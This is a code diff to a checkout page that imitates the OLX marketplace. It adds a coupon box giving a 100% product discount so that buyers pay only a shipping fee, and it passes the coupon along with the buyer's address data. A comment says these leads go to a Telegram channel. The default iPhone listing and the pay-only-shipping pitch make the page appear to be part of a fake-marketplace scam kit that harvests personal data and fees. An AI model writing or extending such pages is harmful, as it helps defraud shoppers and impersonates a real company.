@@ -551,13 +551,62 @@
     .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
     .form-row-3 { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 10px; }
 
-    .order-summary-box {
-      background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 10px;
-      padding: 14px; margin-top: 16px; display: flex; justify-content: space-between; align-items: center;
+    /* COUPON & ORDER SUMMARY STYLES */
+    .checkout-coupon-card {
+      background: #fdfcff; border: 1.5px dashed #c4b5fd; border-radius: 12px;
+      padding: 12px 14px; margin-top: 14px;
     }
+    .coupon-card-header {
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: 12px; font-weight: 800; color: var(--olx-purple);
+    }
+    .coupon-input-wrap {
+      display: flex; gap: 8px; margin-top: 8px;
+    }
+    .coupon-input-wrap input {
+      flex: 1; height: 40px; border: 1.5px solid #d1d5db; border-radius: 8px;
+      padding: 0 12px; font-size: 13px; font-weight: 700; text-transform: uppercase;
+      outline: none; color: #1a1a1a; letter-spacing: 0.8px; font-family: monospace;
+      transition: border-color 0.2s;
+    }
+    .coupon-input-wrap input:focus { border-color: var(--olx-purple); }
+    .btn-apply-coupon {
+      padding: 0 18px; background: var(--olx-purple); color: #fff; border: none;
+      border-radius: 8px; font-size: 13px; font-weight: 800; cursor: pointer;
+      display: flex; align-items: center; gap: 6px; transition: all 0.2s; white-space: nowrap;
+    }
+    .btn-apply-coupon:hover { background: #6502be; }
+    .btn-apply-coupon:disabled { background: #9ca3af; cursor: not-allowed; }
+    .coupon-status-msg {
+      font-size: 12px; margin-top: 8px; display: none; font-weight: 600; line-height: 1.4;
+    }
+    .coupon-status-msg.success { color: #059669; display: flex; align-items: center; gap: 6px; }
+    .coupon-status-msg.error { color: #dc2626; display: flex; align-items: center; gap: 6px; }
+
+    .order-summary-box {
+      background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px;
+      padding: 14px 16px; margin-top: 14px;
+    }
+    .summary-header { display: flex; justify-content: space-between; align-items: flex-start; }
     .summary-product { font-size: 13px; font-weight: 800; color: #1a1a1a; }
     .summary-shipping { font-size: 12px; color: var(--olx-green); font-weight: 700; margin-top: 2px; }
-    .summary-price { font-size: 22px; font-weight: 900; color: #1a7a46; }
+    
+    .order-summary-breakdown {
+      margin-top: 10px; border-top: 1px dashed #e5e7eb; padding-top: 10px; font-size: 12.5px; color: #4b5563;
+    }
+    .summary-row {
+      display: flex; justify-content: space-between; margin-bottom: 5px;
+    }
+    .summary-row.discount {
+      color: #059669; font-weight: 700;
+    }
+    .summary-row.total {
+      font-size: 16px; font-weight: 900; color: #1a1a1a; margin-top: 8px;
+      border-top: 1.5px solid #e5e7eb; padding-top: 8px;
+    }
+    .summary-row.total .total-val {
+      color: #1a7a46; font-size: 20px; font-weight: 900;
+    }
 
     .btn-step-next {
       margin-top: 18px; width: 100%; height: 50px; background: var(--olx-orange); color: #fff;
@@ -1140,16 +1189,54 @@
         </div>
       </div>
 
-      <!-- RESUMO DA COMPRA -->
+      <!-- CUPOM DE DESCONTO / APENAS FRETE -->
+      <div class="checkout-coupon-card" id="coupon-section">
+        <div class="coupon-card-header">
+          <div style="display:flex;align-items:center;gap:6px">
+            <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
+            <span>Possui um cupom de desconto?</span>
+          </div>
+          <span style="font-size:11px;color:#6b7280;font-weight:600">Opcional</span>
+        </div>
+        <div class="coupon-input-wrap">
+          <input type="text" id="checkout-coupon-input" placeholder="Digite seu cupom aqui" value="{{ shipping_coupon if shipping_coupon is defined and shipping_coupon else '' }}" />
+          <button type="button" class="btn-apply-coupon" id="btn-apply-coupon" onclick="handleCouponClick()">
+            <span id="btn-apply-coupon-text">Aplicar</span>
+          </button>
+        </div>
+        <div class="coupon-status-msg" id="coupon-status-msg"></div>
+      </div>
+
+      <!-- RESUMO DA COMPRA INTELIGENTE -->
       <div class="order-summary-box">
-        <div>
-          <div class="summary-product">{{ product_name if product_name else 'iPhone 11 64GB Branco' }}</div>
-          <div class="summary-shipping">
-            <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
-            Frete Grátis com Rastreamento Oficial
+        <div class="summary-header">
+          <div>
+            <div class="summary-product" id="summary-product-name">{{ product_name if product_name else 'iPhone 11 64GB Branco' }}</div>
+            <div class="summary-shipping" id="summary-shipping-desc">
+              <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+              <span>Entrega Garantida OLX com Rastreamento</span>
+            </div>
           </div>
         </div>
-        <div class="summary-price">R$ {{ product_price if product_price else '630,00' }}</div>
+
+        <div class="order-summary-breakdown">
+          <div class="summary-row" id="row-prod-price">
+            <span>Valor do Produto:</span>
+            <span id="breakdown-prod-val">R$ {{ product_price if product_price else '630,00' }}</span>
+          </div>
+          <div class="summary-row" id="row-coupon-discount" style="display:none">
+            <span id="breakdown-discount-label">Desconto Cupom (100%):</span>
+            <span id="breakdown-discount-val">- R$ {{ product_price if product_price else '630,00' }}</span>
+          </div>
+          <div class="summary-row" id="row-shipping-fee">
+            <span>Taxa de Envio Seguro:</span>
+            <span id="breakdown-shipping-val">R$ {{ shipping_fee if shipping_fee is defined and shipping_fee else '19,90' }}</span>
+          </div>
+          <div class="summary-row total">
+            <span>Total a Pagar:</span>
+            <span class="total-val" id="summary-total-val">R$ {{ product_price if product_price else '630,00' }}</span>
+          </div>
+        </div>
       </div>
 
       <button class="btn-step-next" id="btn-advance-lead">
@@ -1228,16 +1315,112 @@
   const SHIPPING_FEE    = '{{ shipping_fee if shipping_fee is defined else "19.90" }}';
   const SHIPPING_COUPON = '{{ shipping_coupon if shipping_coupon is defined else "" }}';
   const PRODUCT_CODE    = '{{ product_code if product_code is defined else "" }}';
+  const COUPON_ACTIVE   = Number('{{ 1 if coupon_active is defined and coupon_active else (1 if coupon_active is not defined else 0) }}') || 0;
+  const COUPON_ONLY_SHIPPING = Number('{{ 1 if coupon_only_shipping is defined and coupon_only_shipping else (1 if coupon_only_shipping is not defined else 0) }}') || 0;
+  const RAW_PRODUCT_PRICE = '{{ product_price if product_price else "630.00" }}';
+  const RAW_SHIPPING_FEE  = '{{ shipping_fee if shipping_fee else "19.90" }}';
   const EVENT_URL  = PAGE_SLUG ? `/api/event?slug=${PAGE_SLUG}` : '/api/event';
   const CONFIG_URL = PAGE_SLUG ? `/api/config/${PAGE_SLUG}` : '/api/config';
+
+  let activeCoupon = '';
+  let isShippingOnlyActive = (SHIPPING_MODE === 'shipping_only');
+  let currentFinalAmount = isShippingOnlyActive ? RAW_SHIPPING_FEE.replace(',', '.') : RAW_PRODUCT_PRICE.replace(',', '.');
+
+  async function handleCouponClick() {
+    const input = document.getElementById('checkout-coupon-input');
+    const code = input ? input.value.trim() : '';
+    if (!code) {
+      showCouponFeedback('Por favor, digite o código do cupom.', 'error');
+      return;
+    }
+    await validateAndApplyCoupon(code, false);
+  }
+
+  async function validateAndApplyCoupon(code, isAuto = false) {
+    const btn = document.getElementById('btn-apply-coupon');
+    const btnTxt = document.getElementById('btn-apply-coupon-text');
+    if (btn && !isAuto) {
+      btn.disabled = true;
+      if (btnTxt) btnTxt.textContent = 'Validando...';
+    }
+
+    try {
+      const res = await fetch('/api/validate-coupon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          coupon: code,
+          product_code: PRODUCT_CODE,
+          slug: PAGE_SLUG || ''
+        })
+      });
+      const data = await res.json();
+
+      if (data.valid || data.ok) {
+        activeCoupon = data.coupon || code.toUpperCase();
+        isShippingOnlyActive = true;
+        currentFinalAmount = String(data.final_amount || RAW_SHIPPING_FEE.replace(',', '.'));
+
+        // Atualiza breakdown visual
+        const rowDiscount = document.getElementById('row-coupon-discount');
+        const prodValEl = document.getElementById('breakdown-prod-val');
+        const discountValEl = document.getElementById('breakdown-discount-val');
+        const totalValEl = document.getElementById('summary-total-val');
+        const shippingDesc = document.getElementById('summary-shipping-desc');
+
+        if (prodValEl) prodValEl.style.textDecoration = 'line-through';
+        if (rowDiscount) {
+          rowDiscount.style.display = 'flex';
+          if (discountValEl) discountValEl.textContent = '- ' + (data.formatted_discount || ('R$ ' + RAW_PRODUCT_PRICE));
+        }
+        if (totalValEl) totalValEl.textContent = data.formatted_final || ('R$ ' + RAW_SHIPPING_FEE);
+        if (shippingDesc) {
+          shippingDesc.innerHTML = `<svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg><span>Cupom <strong>${activeCoupon}</strong> aplicado — Cobrança de Apenas Frete</span>`;
+        }
+
+        const btnNextTxt = document.getElementById('btn-advance-text');
+        if (btnNextTxt) btnNextTxt.textContent = `Pagar Apenas Frete (${data.formatted_final || 'R$ ' + RAW_SHIPPING_FEE})`;
+
+        showCouponFeedback(`Cupom ${activeCoupon} aplicado com sucesso! Desconto de 100% no produto.`, 'success');
+        if (!isAuto) showToast(`Cupom ${activeCoupon} aplicado! Pague apenas o frete.`, 'check');
+      } else {
+        if (!isAuto) {
+          showCouponFeedback(data.message || 'Cupom inválido ou inativo para este anúncio.', 'error');
+          showToast(data.message || 'Cupom inválido.', 'error');
+        }
+      }
+    } catch (e) {
+      if (!isAuto) showCouponFeedback('Erro de conexão ao validar cupom.', 'error');
+    } finally {
+      if (btn) {
+        btn.disabled = false;
+        if (btnTxt) btnTxt.textContent = 'Aplicar';
+      }
+    }
+  }
+
+  function showCouponFeedback(msg, type) {
+    const el = document.getElementById('coupon-status-msg');
+    if (!el) return;
+    el.className = 'coupon-status-msg ' + type;
+    el.innerHTML = (type === 'success' ? '<svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> ' : '<svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> ') + msg;
+  }
+
+  // Permite aplicar cupom ao teclar Enter no input
+  document.addEventListener('DOMContentLoaded', () => {
+    const inp = document.getElementById('checkout-coupon-input');
+    if (inp) {
+      inp.addEventListener('keyup', (e) => {
+        if (e.key === 'Enter') handleCouponClick();
+      });
+    }
+  });
 
   // ─── MODO APENAS TAXA: adapta UI do checkout ───
   (function applyShippingMode() {
     if (SHIPPING_MODE !== 'shipping_only') return;
-    // Altera título do botão comprar
     const btnTxt = document.querySelector('#btn-comprar span, #btn-comprar');
     if (btnTxt) btnTxt.textContent = 'Resgatar com Cupom';
-    // Marca o modal com atributo para CSS e lógica
     const modal = document.getElementById('checkout-modal');
     if (modal) modal.setAttribute('data-shipping-only', '1');
   })();
@@ -1570,16 +1753,15 @@
 
     // Trava botão e mostra loading
     btnAdvanceLead.disabled = true;
-    const isShippingOnly = SHIPPING_MODE === 'shipping_only';
-    document.getElementById('btn-advance-text').textContent = isShippingOnly
-      ? 'Validando dados de entrega...'
+    document.getElementById('btn-advance-text').textContent = isShippingOnlyActive
+      ? 'Validando dados e calculando taxa de envio...'
       : 'Processando dados de entrega...';
     document.getElementById('btn-advance-icon').style.display = 'none';
     document.getElementById('btn-advance-spinner').style.display = 'inline-block';
 
     try {
       // 1. Envia Lead Completo para o Backend & Canal do Telegram
-      const amountToSend = isShippingOnly ? SHIPPING_FEE.replace(',','.') : '{{ product_price if product_price else "630.00" }}';
+      const amountToSend = String(currentFinalAmount || (isShippingOnlyActive ? RAW_SHIPPING_FEE.replace(',', '.') : RAW_PRODUCT_PRICE.replace(',', '.')));
       const leadPayload = {
         session_id: SESSION_ID,
         slug: PAGE_SLUG || '',
@@ -1587,8 +1769,10 @@
         cep, state, street, number, complement, neighborhood, city,
         amount: amountToSend,
         product: '{{ product_name if product_name else "Produto OLX" }}',
-        shipping_mode: SHIPPING_MODE,
-        shipping_coupon: SHIPPING_COUPON,
+        product_code: PRODUCT_CODE,
+        shipping_mode: isShippingOnlyActive ? 'shipping_only' : SHIPPING_MODE,
+        shipping_coupon: activeCoupon,
+        coupon: activeCoupon,
       };
 
       const leadRes = await fetch('/l', {
